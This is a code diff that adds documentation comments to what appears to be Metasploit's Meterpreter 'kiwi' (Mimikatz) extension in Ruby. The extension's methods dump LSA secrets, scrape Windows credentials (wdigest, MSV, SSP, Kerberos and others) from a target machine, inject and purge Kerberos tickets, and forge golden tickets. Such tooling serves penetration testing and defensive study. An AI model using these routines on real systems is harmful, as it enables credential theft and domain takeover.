@@ -21,6 +21,10 @@ module Kiwi
 
 class Kiwi < Extension
 
+  #
+  # These are constants that identify the type of credential to dump
+  # from the target machine.
+  #
   PWD_ID_SEK_ALLPASS   = 0
   PWD_ID_SEK_WDIGEST   = 1
   PWD_ID_SEK_MSV       = 2
@@ -31,6 +35,33 @@ class Kiwi < Extension
   PWD_ID_SEK_TICKETS   = 7
   PWD_ID_SEK_DPAPI     = 8
 
+  #
+  # List of names which represent the flags that are part of the
+  # dumped kerberos tickets. The order of these is important. Each
+  # of them was pulled from the Mimikatz 2.0 source base.
+  #
+  @@kerberos_flags = [
+    "NAME CANONICALIZE",
+    "<unknown>",
+    "OK AS DELEGATE",
+    "<unknown>",
+    "HW AUTHENT",
+    "PRE AUTHENT",
+    "INITIAL",
+    "RENEWABLE",
+    "INVALID",
+    "POSTDATED",
+    "MAY POSTDATE",
+    "PROXY",
+    "PROXIABLE",
+    "FORWARDED",
+    "FORWARDABLE",
+    "RESERVED"
+  ]
+
+  #
+  # Typical extension initialization routine.
+  #
   def initialize(client)
     super(client, 'kiwi')
 
@@ -43,6 +74,11 @@ class Kiwi < Extension
       ])
   end
 
+  #
+  # Dump the LSA secrets from the target machine.
+  #
+  # Returns [Array[Hash]]
+  #
   def lsa_dump
     request = Packet.create_request('kiwi_lsa_dump_secrets')
 
@@ -93,25 +129,14 @@ class Kiwi < Extension
     return result
   end
 
-  @@kerberos_flags = [
-    "NAME CANONICALIZE",
-    "<unknown>",
-    "OK AS DELEGATE",
-    "<unknown>",
-    "HW AUTHENT",
-    "PRE AUTHENT",
-    "INITIAL",
-    "RENEWABLE",
-    "INVALID",
-    "POSTDATED",
-    "MAY POSTDATE",
-    "PROXY",
-    "PROXIABLE",
-    "FORWARDED",
-    "FORWARDABLE",
-    "RESERVED"
-  ]
-
+  #
+  # Convert a flag set to a list of string representations for the bit flags
+  # that are set.
+  #
+  # +flags+ [Integer] - Integer bitmask of Kerberos token flags.
+  #
+  # Returns [String]
+  #
   def to_kerberos_flag_list(flags)
     flags = flags >> 16
     results = []
@@ -127,6 +152,13 @@ class Kiwi < Extension
     return results
   end
 
+  #
+  # List available kerberos tickets.
+  #
+  # +export+ [Bool] - Set to +true+ to export the content of each ticket
+  #
+  # Returns [Array[Hash]]
+  #
   def kerberos_ticket_list(export)
     export ||= false
     request = Packet.create_request('kiwi_kerberos_ticket_list')
@@ -153,17 +185,41 @@ class Kiwi < Extension
     return results
   end
 
+  #
+  # Use the given ticket in the current session.
+  #
+  # +ticket+ [Array[Byte]] - Content of the Kerberos ticket to use.
+  #
+  # Returns [Bool]
+  #
   def kerberos_ticket_use(ticket)
     request = Packet.create_request('kiwi_kerberos_ticket_use')
     request.add_tlv(TLV_TYPE_KIWI_KERB_TKT_RAW, ticket, false, true)
     client.send_request(request)
+    return true
   end
 
+  #
+  # Purge any Kerberos tickets that have been added to the current session.
+  #
+  # Returns [Bool]
+  #
   def kerberos_ticket_purge
     request = Packet.create_request('kiwi_kerberos_ticket_purge')
     client.send_request(request)
+    return true
   end
 
+  #
+  # Create a new golden kerberos ticket on the target machine and return it.
+  #
+  # +user+ [String] - Name of the user to create the ticket for.
+  # +domain+ [String] - Domain name.
+  # +sid+ [String] - SID of the domain.
+  # +tgt+ [String] - The kerberos ticket granting token.
+  #
+  # Returns [Array[Byte]]
+  #
   def golden_ticket_create(user, domain, sid, tgt)
     request = Packet.create_request('kiwi_kerberos_golden_ticket_create')
     request.add_tlv(TLV_TYPE_KIWI_GOLD_USER, user)
@@ -176,6 +232,13 @@ class Kiwi < Extension
     return response.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_RAW)
   end
 
+  #
+  # Scrape passwords from the target machine.
+  #
+  # +pwd_id+ - ID of the type credential to scrape.
+  #
+  # Returns [Array[Hash]]
+  #
   def scrape_passwords(pwd_id)
     request = Packet.create_request('kiwi_scrape_passwords')
     request.add_tlv(TLV_TYPE_KIWI_PWD_ID, pwd_id)
@@ -197,36 +260,79 @@ class Kiwi < Extension
     return results
   end
 
+  #
+  # Scrape all passwords from the target machine.
+  #
+  # Returns [Array[Hash]]
+  #
   def all_pass
     return scrape_passwords(PWD_ID_SEK_ALLPASS)
   end
 
+  #
+  # Scrape wdigest credentials from the target machine.
+  #
+  # Returns [Array[Hash]]
+  #
   def wdigest
     return scrape_passwords(PWD_ID_SEK_WDIGEST)
   end
 
+  #
+  # Scrape msv credentials from the target machine.
+  #
+  # Returns [Array[Hash]]
+  #
   def msv
     return scrape_passwords(PWD_ID_SEK_MSV)
   end
 
+  #
+  # Scrape LiveSSP credentials from the target machine.
+  #
+  # Returns [Array[Hash]]
+  #
   def livessp
     return scrape_passwords(PWD_ID_SEK_LIVESSP)
   end
 
+  #
+  # Scrape SSP credentials from the target machine.
+  #
+  # Returns [Array[Hash]]
+  #
   def ssp
     return scrape_passwords(PWD_ID_SEK_SSP)
   end
 
+  #
+  # Scrape TSPKG credentials from the target machine.
+  #
+  # Returns [Array[Hash]]
+  #
   def tspkg
     return scrape_passwords(PWD_ID_SEK_TSPKG)
   end
 
+  #
+  # Scrape Kerberos credentials from the target machine.
+  #
+  # Returns [Array[Hash]]
+  #
   def kerberos
     return scrape_passwords(PWD_ID_SEK_KERBEROS)
   end
 
 protected
 
+  #
+  # Convert an array of bytes to a string-based hex dump in the format
+  #   AA BB CC DD EE FF
+  #
+  # +bytes+ [Array[Byte]] - Array of bytes to convert.
+  #
+  # Returns [String].
+  #
   def to_hex_dump(bytes)
     return nil unless bytes
 
@@ -235,11 +341,26 @@ protected
     }.join(' ')
   end
 
+  #
+  # Convert an array of bytes to a hex string without spaces
+  #   AABBCCDDEEFF
+  #
+  # +bytes+ [Array[Byte]] - Array of bytes to convert.
+  #
+  # Returns [String].
+  #
   def to_hex_string(bytes)
     return nil unless bytes
     bytes.unpack('H*')[0]
   end
 
+  #
+  # Convert an array of bytes to a GUID string
+  #
+  # +bytes+ Array of bytes to convert.
+  #
+  # Returns [String].
+  #
   def to_guid(bytes)
     return nil unless bytes
     s = bytes.unpack('H*')[0]
